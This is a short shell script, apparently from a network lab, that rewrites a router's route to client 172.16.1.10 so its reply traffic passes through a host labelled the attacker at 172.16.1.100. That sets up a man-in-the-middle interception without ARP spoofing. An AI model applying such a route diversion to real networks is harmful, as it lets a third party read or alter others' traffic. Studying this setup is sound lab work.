#!/bin/sh
# Run inside edge-router.
# Send every reply bound for the client through the attacker, which relays it
# on. This is the only change on the router; the client's own configuration is
# untouched and there is no ARP spoofing.
ip route replace 172.16.1.10/32 via 172.16.1.100
echo "diversion ON  : replies to 172.16.1.10 now go via 172.16.1.100 (attacker)"
ip route show 172.16.1.10
